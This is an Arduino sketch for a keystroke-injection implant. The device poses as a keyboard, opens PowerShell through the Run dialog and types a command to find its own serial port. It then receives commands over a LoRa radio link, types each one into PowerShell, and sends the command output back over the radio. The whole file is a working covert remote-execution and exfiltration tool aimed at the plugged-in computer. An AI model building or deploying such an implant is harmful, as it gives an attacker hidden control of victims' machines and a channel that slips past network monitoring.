#include <LoRa.h>
#include <Keyboard.h>

String COM_PORT = "";
String pipe_start = "$lines = ";
String pipe_middle = " | % { $_.ToString() }; $joinedLines = $lines -join '?'; $port = new-Object System.IO.Ports.SerialPort ";
String pipe_end = ", 9600, None, 8, One; $port.Open(); $port.WriteLine($joinedLines); $port.Close();";
String port_sensing = "Get-WmiObject -Class Win32_SerialPort | % {if ($_.Description -match 'Arduino') {iex \"mode $($_.DeviceID): baud=9600 parity=n data=8 stop=1\"; $port = new-Object System.IO.Ports.SerialPort $_.DeviceID,9600,None,8,One; $port.Open(); $port.WriteLine($_.DeviceID); $port.Close()}}";

void openPowerShell() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  Keyboard.println("PowerShell");
  delay(1000);
  Keyboard.println(port_sensing);
  delay(100);
  while (1) {
    if (Serial.available()) {
      COM_PORT = Serial.readStringUntil('\n');
      if (COM_PORT != "") {
        break;
      }
    }
  }
}

void payloadInjection(String payload) {
  Keyboard.println(payload);
  delay(1000);
}

void setup() {
  Keyboard.begin();
  delay(1000);
	if (!LoRa.begin(915E6)) {
			while(1);
	}
  openPowerShell();
}

void loop() {
  int packetSize = LoRa.parsePacket();
  
  if (packetSize) {
    String recvOutput = "";
    while (LoRa.available()) {
      recvOutput += (char) LoRa.read();
    }
    if (recvOutput.startsWith("[PLD] ")) {
      recvOutput.remove(0, 6);
      String payload = pipe_start + recvOutput + pipe_middle + COM_PORT + pipe_end;
      payloadInjection(payload);
    }
  }

  if (Serial.available()) {
    String payload_output = Serial.readStringUntil('\n');
		LoRa.beginPacket();
    LoRa.print("[OUT] " + payload_output);
    LoRa.endPacket();
  }
}
